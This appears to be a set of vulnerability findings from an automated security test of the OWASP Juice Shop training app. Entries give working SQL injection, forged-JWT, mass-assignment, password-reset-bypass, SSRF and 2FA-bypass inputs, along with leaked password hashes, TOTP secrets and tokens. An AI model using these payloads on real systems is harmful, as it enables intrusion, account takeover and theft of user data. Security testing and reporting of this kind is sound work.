candidates.title: Mass Assignment Privilege Escalation via POST /api/Users
candidates.proof_excerpt: POST /api/Users with body {"email":"test_mass_assign@test.com","password":"test123","isAdmin":true,"role":"admin"} returned HTTP 201 with {"data":{"email":"test_mass_assign@test.com","role":"admin","isActive":true}}. The user was created with role=admin, granting full administrative privileges.
candidates.causality: The user registration endpoint maps request body fields directly to the User model without filtering sensitive fields like role. Passing role=admin in the JSON body sets the user role to admin.
candidates.reproducibility: Send POST /api/Users with Content-Type application/json and body {"email":"attacker@test.com","password":"attacker123","role":"admin"}. The response confirms role=admin.
candidates.impact: Unprivileged attacker can register as an administrator, granting access to admin-only functionality (admin panel, user management, etc.).

candidates.title: Excessive Data Exposure - /rest/memories leaks embedded user password hashes
candidates.proof_excerpt: GET /rest/memories returns photo memories with embedded User objects containing password hashes (e.g. bjoern@owasp.org hash 9283f1b2e9669749081963be0462e466, bjoern.kimminich@gmail.com hash 6edd9d726cbdc873c539e41ae8757b8c)
candidates.causality: API includes nested user objects with sensitive fields in responses
candidates.reproducibility: Send GET /rest/memories with any valid JWT token
candidates.impact: Disclosure of password hashes for admin and deluxe users enabling credential compromise

candidates.title: Default/Weak Admin Credentials - admin@juice-sh.op:admin123
candidates.proof_excerpt: POST /rest/user/login with {"email":"admin@juice-sh.op","password":"admin123"} returns valid JWT token with role=admin and bid=1
candidates.causality: Application ships with a default admin account using well-known credentials
candidates.reproducibility: Send login request with these credentials
candidates.impact: Full admin access to the application including all user data, admin functionality, and configuration

candidates.title: Application Configuration Disclosure
candidates.proof_excerpt: GET /rest/admin/application-configuration returns full config including Google OAuth clientId (1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq.apps.googleusercontent.com), authorized redirects, social URLs, product data, and challenge configurations
candidates.causality: Admin configuration API endpoint is accessible without proper authentication
candidates.reproducibility: Send GET to the endpoint without authentication
candidates.impact: Exposure of OAuth client ID, internal configuration, and security-related settings

candidates.title: Directory Listing Enabled on Sensitive Paths
candidates.proof_excerpt: GET /ftp/ returns directory listing (11274 bytes), also /encryptionkeys and /support/logs return listings
candidates.causality: Web server directory listing is enabled on sensitive directories
candidates.reproducibility: Browse to these paths
candidates.impact: Exposure of file inventory enabling further attacks like file read/download

candidates.title: SQL Injection in /rest/products/search — Full Database Extraction
candidates.proof_excerpt: Payload: apple')) UNION SELECT 1,group_concat(email||':'||password),3,4,5,6,7,8,9 FROM Users-- returned all 28 user rows with email:password_hash including admin@juice-sh.op:0192023a7bbd73250516f069df18b500, role enumeration via UNION SELECT 1,group_concat(id||':'||email||':'||password||':'||role),3,4,5,6,7,8,9 FROM Users-- showed roles (admin, customer, deluxe, accounting). SQLite version 3.44.2 confirmed via sqlite_version(). Table listing: Users, Products, Challenges, etc.
candidates.causality: The q parameter is directly interpolated into a SQL query without sanitization. Closing the LIKE clause with ')) and appending UNION SELECT allows attacker-controlled output mapping to the 9 result columns.
candidates.reproducibility: Send GET /rest/products/search?q=apple')) UNION SELECT 1,group_concat(email||':'||password),3,4,5,6,7,8,9 FROM Users-- . All user credentials with password hashes are returned in the JSON response.
candidates.impact: Full compromise of all user accounts (admin, customer, deluxe, accounting). Password hashes can be cracked offline. Attacker can authenticate as any user including admin.

candidates.title: DOM XSS in search functionality via unsafe innerHTML
candidates.proof_excerpt: Browser execution proof: visited #/search?q= and document.title changed to 'PX_continueCode=8MNaK5VROexd8Nhvt9cOTLSmtyyhYztKziemIaXH34iJ8ij70ZDW3j9Qm42o; language=en'. The q parameter HTML is rendered inside via innerHTML with event handlers intact and executable.
candidates.causality: The q URL fragment parameter is reflected verbatim into via innerHTML (Angular [innerHTML] binding or bypassSecurityTrustHtml). Input payload appears as rendered DOM element with executable onerror handler.
candidates.reproducibility: Visit http://127.0.0.1:3011/#/search?q= in any browser. The script executes immediately on page load.
candidates.impact: Arbitrary JavaScript execution in the origin context. Attacker can steal cookies (document.cookie accessible as shown), perform authenticated actions, deface page, or redirect to phishing pages. Cookies are not HttpOnly so session theft is trivial.

candidates.title: Missing Authentication on Product API (BFLA)
candidates.proof_excerpt: PUT /api/products/1 with body {"name":"hacked","price":0.01} returned HTTP 200 with name changed to 'hacked' and price changed to 0.01. No authentication token was required. POST /api/products also allowed creating products (HTTP 201) without auth. Only DELETE required auth (401).
candidates.causality: The product modification endpoints do not enforce authentication or authorization checks. Any unauthenticated user can create or modify product data.
candidates.reproducibility: Send PUT /api/products/1 with {"name":"test","price":0.01} without any auth headers. Product is modified successfully.
candidates.impact: Attacker can arbitrarily modify product names, prices, descriptions, and images. Could set prices to near-zero for fraudulent purchases or deface product listings.

candidates.title: Excessive Data Exposure on /api/challenges
candidates.proof_excerpt: GET /api/challenges returns all 60+ challenge records including fields: id, key, name, category, description, difficulty, mitigationUrl, solved status, codingChallengeStatus, disabledEnv, ChallengeDependencies with API keys and URLs. No authentication required.
candidates.causality: The /api/challenges endpoint exposes all challenge metadata without any access control. It should require admin authentication.
candidates.reproducibility: Send GET /api/challenges without any auth token. Full challenge dataset is returned.
candidates.impact: Internal challenge configuration, mitigation strategies, API keys/URLs, and solved status are exposed to unauthenticated attackers. Facilitates targeted exploitation of unresolved vulnerabilities.

candidates.title: JWT Algorithm Confusion Attack - Forged Admin Token via alg:none and HS256 with RSA Public Key
candidates.proof_excerpt: Two forged JWTs accepted by server returning admin identity ({"user":{"id":1,"email":"admin@juice-sh.op"}}): 1) alg:none token: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiaXNBY3RpdmUiOnRydWV9LCJiaWQiOjEsImlhdCI6MTc4NDg1ODAzM30. 2) HS256 with RSA public key as HMAC secret: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.[payload].GYtP9oBPm8UcoloXUt8MYuFmGGNCZ8sTRS0g4hmpqLs. Public key obtained from /encryptionkeys/jwt.pub.
candidates.causality: JWT library does not enforce algorithm validation. When the server receives a token with alg:none, it skips signature verification. When receiving HS256, it uses the RSA public key (obtained from /encryptionkeys/jwt.pub) as HMAC secret, which is known to the attacker.
candidates.reproducibility: 1) GET /encryptionkeys/jwt.pub to obtain RSA public key. 2) Craft JWT with alg:none or alg:HS256 signed with public key as HMAC secret. 3) Send GET /rest/user/whoami with Authorization: Bearer <forged_token>. Server returns admin identity.
candidates.impact: Complete authentication bypass. Attacker can forge tokens for any user including admin, gaining full administrative access to all application functionality and data.

candidates.title: Security Question Enumeration via /rest/user/security-question
candidates.proof_excerpt: GET /rest/user/security-question?email=admin@juice-sh.op returns {"question":{"id":2,"question":"Mother's maiden name?"}}. No authentication required. Any email address can be queried to reveal the associated security question, enabling targeted social engineering or brute-force answers.
candidates.causality: The endpoint does not require authentication and allows arbitrary email queries to retrieve the security question for password reset.
candidates.reproducibility: Send GET /rest/user/security-question?email=<target_email> without any auth. The security question is returned.
candidates.impact: Attacker can enumerate valid user emails and pair them with their security questions, facilitating password reset attacks and account takeover.

candidates.title: Unauthenticated Mass User Data Disclosure via /api/Users
candidates.proof_excerpt: GET /api/Users without any auth returns all 30+ users with emails, roles, deluxeTokens, lastLoginIp. Response: {"status":"success","data":[{"id":1,"email":"admin@juice-sh.op","role":"admin"},{"id":2,"email":"jim@juice-sh.op","role":"customer"},...]}
candidates.causality: No auth required on User listing endpoint
candidates.reproducibility: GET /api/Users without any auth headers or cookies
candidates.impact: Mass disclosure of all user PII (emails, roles, tokens, IPs); 30+ user records exposed including multiple admins

candidates.title: Unauthenticated basket access and order placement (IDOR + authz bypass)
candidates.proof_excerpt: GET /rest/basket/1 without auth returns admin basket with products. POST /rest/basket/1/checkout without auth places order: {"orderConfirmation":"b642-a1ad8ed4f3015990"}. Order appears in /rest/order-history with masked email, totalPrice, products.
candidates.causality: No auth check on basket GET/POST; any basket ID can be accessed and checked out
candidates.reproducibility: Called GET /rest/basket/1 through 8 without auth — all returned data. Called POST /rest/basket/1/checkout twice, both returned confirmations.
candidates.impact: Attacker can view any user's shopping basket contents and place fraudulent orders on any basket without authentication

candidates.title: Unauthenticated order history disclosure via /rest/order-history
candidates.proof_excerpt: GET /rest/order-history without auth returns all orders: {"status":"success","data":[{"orderId":"b642-a1ad8ed4f3015990","email":"t*st@t*st.c*m","totalPrice":17.98,"products":[...]},...]}
candidates.causality: No auth required to view all placed orders including product details and masked email
candidates.reproducibility: Repeated calls return the same order data
candidates.impact: Exposure of order details including products, prices, and masked email addresses

candidates.title: Unauthenticated admin account takeover via empty-current-password in /rest/user/change-password
candidates.proof_excerpt: GET /rest/user/change-password?current=&new=admin123&repeat=admin123 (anon, no session) returns: {"user":{"id":1,"email":"admin@juice-sh.op","password":"0192023a7bbd73250516f069df18b500","role":"admin",...}} and changes admin password. Login then succeeds with the new password, returning admin JWT token.
candidates.causality: Empty 'current' parameter bypasses password verification; defaults to user id 1 (admin) when no session; leaks full record and changes password
candidates.reproducibility: Called 4+ times with anon actor, each time returned admin's full record and changed password to the value in 'new' parameter
candidates.impact: Complete admin account takeover by any unauthenticated attacker. Privilege escalation from anon to admin. Full system compromise.

candidates.title: Directory Listing - Sensitive Key Disclosure
candidates.proof_excerpt: Directory listing at /encryptionkeys exposes jwt.pub (RSA public key, 248 bytes) and premium.key (50 bytes, contains deluxe token: 1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42)
candidates.causality: Express serve-static directory listing enabled on /encryptionkeys path.
candidates.reproducibility: GET /encryptionkeys returns HTML directory listing with file names, sizes, and modification dates.
candidates.impact: Exposes cryptographic key material enabling JWT algorithm confusion attack for admin access.

candidates.title: Directory Listing - Log File Exposure
candidates.proof_excerpt: Directory listing at /support/logs exposes access.log.2026-07-24 (49KB) and audit.json (348B). Access log contains detailed API request traces including SQL injection attempts, admin endpoints, and user activity.
candidates.causality: Express serve-static directory listing enabled on /support/logs path.
candidates.reproducibility: GET /support/logs returns HTML directory listing with log files.
candidates.impact: Information disclosure of API surface, user activity, and security testing traces.

candidates.title: SSRF via Profile Image URL (Server-Side Request Forgery)
candidates.proof_excerpt: POST /profile/image/url with imageUrl=http://127.0.0.1:3011/rest/admin/application-configuration → server stored URL + dynamically updated CSP img-src + profileImage changed from URL to local file assets/public/images/uploads/24.jpg, proving server-side fetch. The internal /rest/admin/application-configuration endpoint returns full app config including OAuth clientId, authorized redirect URIs, challenge config, and product data.
candidates.causality: User-controlled 'imageUrl' POST parameter on /profile/image/url endpoint → server-side HTTP fetch of attacker-specified URL. The server stores the URL, reflects it in CSP header, and fetches it server-side, saving result locally.
candidates.reproducibility: Multiple POSTs with different internal URLs (http://127.0.0.1:3011/rest/admin/application-configuration, http://127.0.0.1:3011/api/Users, http://127.0.0.1:3011/assets/public/images/uploads/13.jpg) all confirmed URL storage in DB and CSP reflection. Local file creation at assets/public/images/uploads/24.jpg confirms server-side fetch.
candidates.impact: Attacker can force the server to make HTTP requests to any internal resource (127.0.0.1/localhost). Demonstrated access to /rest/admin/application-configuration (full app config with OAuth secrets), /api/Users (all user data). Could scan internal ports, access cloud metadata endpoints (169.254.169.254), or exploit other internal services.

candidates.title: 2FA Bypass via Self-Service TOTP Secret Exposure
candidates.proof_excerpt: 1) Registered user worker_user_1744857566@test.com (POST /api/Users). 2) Logged in, got JWT. 3) GET /rest/2fa/status returned secret=24OLLTAN5W5BECFM3I2QZFJUJ7IDCDJ4 and setupToken (even though setup=false). 4) Generated TOTP 388777 via Python TOTP implementation. 5) POST /rest/2fa/setup with {password, initialToken:388777, setupToken} returned 200 (2FA enabled). 6) POST /rest/user/login returned totp_token_required with tmpToken. 7) POST /rest/2fa/verify with {tmpToken, totpToken:854142} returned new JWT. 8) GET /rest/user/whoami with new token returned user identity (id:40, email:worker_user_1744857566@test.com) proving authenticated session.
candidates.causality: The /rest/2fa/status endpoint exposes the TOTP secret and setupToken to any authenticated (and unauthenticated) user. An attacker can generate valid TOTP codes without possessing the physical authenticator device, enabling them to enroll their own authenticator or bypass existing 2FA.
candidates.reproducibility: 1) Register new user. 2) GET /rest/2fa/status → receive secret+setupToken. 3) Generate TOTP from secret. 4) POST /rest/2fa/setup with {password, initialToken:TOTP, setupToken} → 200. 5) Login triggers 2FA challenge. 6) Verify with generated TOTP → full auth.
candidates.impact: Complete bypass of two-factor authentication. An attacker who obtains any user's TOTP secret (exposed via /rest/2fa/status) can generate valid 2FA codes without the owner's device, allowing account takeover even when 2FA is enabled.

candidates.title: TOTP Secret Disclosure via Unauthenticated /rest/2fa/status
candidates.proof_excerpt: GET /rest/2fa/status without any auth token returned {"setup":false,"secret":"JKWFAXQ5KVT3RLSHIWPRCEE6IC2LWOTY","email":"test@test.com","setupToken":"eyJ0eXAi...(RS256 JWT)"}. The TOTP secret and setupToken are exposed without authentication.
candidates.causality: The /rest/2fa/status endpoint does not require authentication and returns the TOTP secret for a user (test@test.com) even though 2FA is not set up. This leaks the secret allowing unauthorized 2FA enrollment.
candidates.reproducibility: Send GET request to /rest/2fa/status without any auth token.
candidates.impact: Information disclosure of TOTP secrets and setup tokens without authentication. An attacker can use this to enroll their own device for another user's account.

candidates.title: Password Hash Leakage via /rest/memories
candidates.proof_excerpt: GET /rest/memories (authenticated) returned user data including MD5 password hashes for all users: bjoern@owasp.org:9283f1b2e9669749081963be0462e466, bjoern.kimminich@gmail.com (admin):6edd9d726cbdc873c539e41ae8757b8c, emma@juice-sh.op:402f1c4a75e316afec5a6ea63147f739, john@juice-sh.op:00479e957b6b42c459ee5746478e4d45, ethereum@juice-sh.op:2c17c6393771ee3048ae34d6b380c5ec
candidates.causality: The /rest/memories endpoint includes nested User objects with password field in the response. No selective field filtering is applied.
candidates.reproducibility: POST /rest/user/login to get JWT. GET /rest/memories with JWT. Response includes User.password hashes.
candidates.impact: Exposure of password hashes (MD5) for all application users including admin (bjoern.kimminich@gmail.com), enabling offline brute-force attacks.

candidates.title: Broken access control — cross-actor or unauthenticated object access
candidates.proof_excerpt: Authz matrix HTTP proof: anon GET /api/Users → 200 (sensitive collection); cross-actor GET both 200 on id=1 path=/api/Users; anon DELETE /api/Feedbacks/1 id=1 → 200; cross-actor GET both 200 on id=1 path=/api/Feedbacks; write_tried=True; cells_sample=[{"resource": "/api/Users", "actor": "anon", "method": "GET", "status": 200, "id": null}, {"resource": "/api/Users", "actor": "actor_a", "method": "GET", "status": 200, "id": null}, {"resource": "/api/Users", "actor": "actor_b", "method": "GET", "status": 200, "id": null}, {"resource": "/api/Users/1", "actor": "anon", "method": "GET", "status": 200, "id": "1"}, {"resource": "/api/Users/1", "actor": "actor_a", "method": "GET", "status": 200, "id": "1"}, {"resource": "/api/Users/1", "actor": "actor_b", "method": "GET", "status": 200, "id": "1"}, {"resource": "/api/Users/1", "actor": "anon", "method": "PUT", "status": 401, "id": "1"}, {"resource": "/api/Users/1", "actor": "anon", "method": "DELETE", "status": 401, "id": "1"}]
candidates.causality: Dual-actor/anon matrix requests caused observable status/body access differentials including write probes
candidates.reproducibility: Replay matrix cells with same actors and object ids
candidates.impact: Unauthorized parties can read or modify other users' resources
